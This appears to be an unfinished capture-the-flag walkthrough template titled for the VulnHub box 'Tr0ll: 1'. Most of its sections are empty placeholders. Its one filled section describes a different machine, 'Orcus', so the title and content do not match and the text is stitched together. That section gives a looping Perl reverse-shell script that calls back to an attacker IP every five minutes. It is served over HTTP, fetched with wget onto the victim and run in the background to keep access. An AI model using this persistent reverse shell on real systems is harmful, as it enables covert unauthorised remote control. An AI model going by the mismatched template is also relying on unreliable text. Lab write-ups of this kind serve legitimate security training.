---
layout: post
title:  "Tr0ll: 1"
date:   2019-05-06 19:34:14 +0000
author: Larry Brown
category: Walkthroughs
tags: [vulnhub]
---
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html><head><meta content="text/html; charset=utf-8" http-equiv="Content-Type"/><meta content="Evernote Mac 7.10 (457750)" name="exporter-version"/><meta content="Larry Brown" name="author"/><meta content="2019-05-06 19:34:14 +0000" name="created"/><meta content="desktop.mac" name="source"/><meta content="2019-05-06 19:35:06 +0000" name="updated"/><title>Tr0ll: 1</title></head><body><div>VulnHub URL: <a href="https://www.vulnhub.com/entry/tr0ll-1,100/" target="_blank">https://www.vulnhub.com/entry/tr0ll-1,100/</a></div><div>Hostname: __HOSTNAME__</div><div>IP Address: __IP_ADDRESS__</div><div><br/></div><div>Date started: __START_DATETIME__</div><div>Date completed: __END_DATETIME__</div><div><br/></div><div><br/></div><div><h2>Information Gathering/Recon</h2></div><div><br/></div><div>The IP address is obtained via DHCP at boot. In my case, the IP is __IP_ADDRESS__.</div><div><br/></div><div><br/></div><div><h2>Service Enumeration/Scanning</h2></div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><span style="font-size: 12px; font-family: Monaco;"><br/></span></div><div><br/></div><!--more--><div><br/></div><div><h2>Gaining Access</h2></div><div><br/></div><div><br/></div><div><h2>Maintaining Access</h2></div><div><br/></div><div>Since SSH is open on the victim, I checked to see if the __USERNAME__ user has a default home directory and shell defined.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@Orcus:/var/www/html/zenphoto/uploaded$ grep `whoami` /etc/passwd</div><div>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</div></div><div><br/></div><div>The home directory exists, but only allows writes by root.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>drwxr-xr-x  4 root root   4096 Oct 22  2016 www</div></div><div><br/></div><div>The default shell is set to '/usr/sbin/nologin', so I won't be able to SSH to the box with this account.</div><div><br/></div><div>I decided to create a simple shell script that will try to connect back to my attacking machine every 5 minutes and use python's SimpleHTTPServer to serve it up to the victim.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/orcus# cat thumbs</div><div>#!/bin/sh</div><div>while true; do</div><div>    perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</div><div>    # sleep for 300 seconds (5 mins)</div><div>    sleep 300</div><div>done</div><div>root@kali:~/Walkthroughs/fristileaks13# python -m SimpleHTTPServer 4321</div><div>Serving HTTP on 0.0.0.0 port 4321 ...</div><div>10.183.0.208 - - [18/Apr/2019 16:37:36] "GET /thumbs HTTP/1.0" 200 -</div></div><div><br/></div><div>I uploaded the script to the victim's __DIRECTORY__ directory and ran it in the background. Now, if I get disconnected, I should be able to restart a listener and get back in within 5 minutes.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@Orcus:/var/www/html/zenphoto/cache$ wget -O thumb 10.183.0.222:4321/thumbs</div><div>--2019-04-16 16:26:34--  <a href="http://10.183.0.222:4321/thumb">http://10.183.0.222:4321/thumb</a></div><div>Connecting to 10.183.0.222:4321... connected.</div><div>HTTP request sent, awaiting response... 200 OK</div><div>Length: 307 [application/octet-stream]</div><div>Saving to: 'thumbs'</div><div><br/></div><div>thumbs               100%[===================&gt;]     307  --.-KB/s    in 0s      </div><div><br/></div><div>2019-04-16 16:26:34 (59.0 MB/s) - 'thumb' saved [307/307]</div><div><br/></div><div>www-data@Orcus:/var/www/html/zenphoto/cache$ chmod +x thumbs</div><div>www-data@Orcus:/var/www/html/zenphoto/cache$ ./thumbs &amp;</div><div>[1] 21552</div></div><div><br/></div><div><br/></div><div><h2>Privilege Escalation</h2></div><div><br/></div><div><br/></div><div><h2>Pivoting</h2></div><div>N/A</div><div><br/></div><div><h2>Clean Up</h2></div><div><br/></div><div>*** REMOVE __FILES__ ***</div><div><br/></div><div><br/></div><div><h2>Additional Info</h2></div><div><br/></div><div><br/></div></body></html>